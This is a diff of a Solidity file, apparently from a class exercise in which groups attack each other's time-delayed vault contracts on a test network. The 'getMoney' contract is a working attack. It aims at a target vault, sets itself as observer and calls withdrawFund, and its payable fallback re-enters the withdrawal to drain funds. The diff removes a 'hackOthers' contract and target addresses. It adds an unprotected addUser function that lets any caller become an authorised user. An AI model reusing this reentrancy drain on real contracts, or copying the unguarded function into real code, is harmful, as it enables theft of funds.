@@ -1,8 +1,5 @@
 pragma solidity ^0.4.17;
-//老董最新合约：0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb
-//Hack合约：0xe359bdc5c9d7f39ccbe26a9a2ca5e0b9091e0c46
-//observe:0x97ddbd0ade30554e05e7b4545db3188b62696178
-//一个测试的老董合约：0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3
+
 contract BasicMultiOwnerVault {
     address[] public authorizedUsers;
     address public owner;
@@ -122,9 +119,9 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
         //this.call(bytes4(sha3("initializeVault()")));
        
         // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
-        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
+        //authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
         //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
-        //authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten
+        authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten
 
         for(uint i=0; i<authorizedUsers.length; i++) {
             votes.push(false);
@@ -144,25 +141,21 @@ contract TimeDelayedVault is BasicMultiOwnerVault {
     function refreshWithdrawTime() {
         nextWithdrawTime = now;
     }
-}
-
-contract hackOthers {
-    address otherAddress = 0x0; //change to othergroup contract address
-    function addObserver() {
-        otherAddress.call(bytes4(sha3("setObserver()")),this);
-    }
-    function setOwner(){ //100% fail
-        otherAddress.call(bytes4(sha3("initilizeVault()")));
+    function addUser(address user){
+        votes.push(false);
+        authorizedUsers.push(user);
     }
 }
 
-contract getMoney{
-    address public ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
+
+
+contract getMoney{ //0x202a08c0b2cf36c94458f85c36914aa50f98bd71
+    address public ct_addr = 0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb;
     uint public count = 0;
     uint public limit = 1;
     uint public gaslimit = 30000000;
     address public ownerLALALA;
-    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
+    TimeDelayedVault ct ;
     
     modifier onlyOwner() {
         require(msg.sender == ownerLALALA);
@@ -176,6 +169,7 @@ contract getMoney{
     }
     function setTarget(address _addr) onlyOwner{
         ct_addr = _addr;
+        ct = TimeDelayedVault(ct_addr);
     }
     function addObserver() onlyOwner{
        ct.setObserver(this);    
@@ -187,9 +181,11 @@ contract getMoney{
     function hack2() onlyOwner{ // need checkObserver first
          ct.setObserver(this);
          count += 1;
-
          ct.withdrawFund(this);
     }    
+    function withdraw(address addr, uint amount) onlyOwner{
+        addr.transfer(amount * 1 ether);
+    }
     function () payable {
         if(count<limit ){
             count += 1;
